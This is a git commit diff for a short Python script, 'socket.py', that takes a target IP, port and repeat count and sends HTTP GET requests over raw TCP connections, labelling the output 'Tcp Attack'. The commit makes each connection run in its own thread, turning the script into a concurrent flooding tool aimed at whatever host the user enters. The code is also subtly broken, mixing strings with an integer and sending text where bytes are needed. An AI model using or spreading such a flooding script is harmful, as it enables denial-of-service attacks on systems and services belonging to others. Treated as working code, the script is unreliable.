e942d5e0099465c5d0ed1aef4db05d90edfdc7d9
RetZ <96674366+ImRetZ@users.noreply.github.com>
2022-04-23 18:37:25 +0700

    Update socket.py

--- socket.py
+++ socket.py
@@ -1,16 +1,18 @@
-import socket
+from socket import *
+import threading
 
 ip = str(input('Ip: '))
 port = int(input('Port: '))
 times = int(input('Times: '))
 
 def tcp():
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s = socket(AF_INET, SOCK_STREAM)
   s.connect((ip, port))
   s.send("GET /" + port + " HTTP/1.1\r\n")
   s.send("Host: " + ip + "\r\n\r\n");
   print("\033[1;36;40mTcp Attack To IP", ip, "PORT", port)
-  s.close
+  s.close()
 
 for i in range(1, times):
-  tcp()
+  th = threading.Thread(target = tcp)
+  th.start()
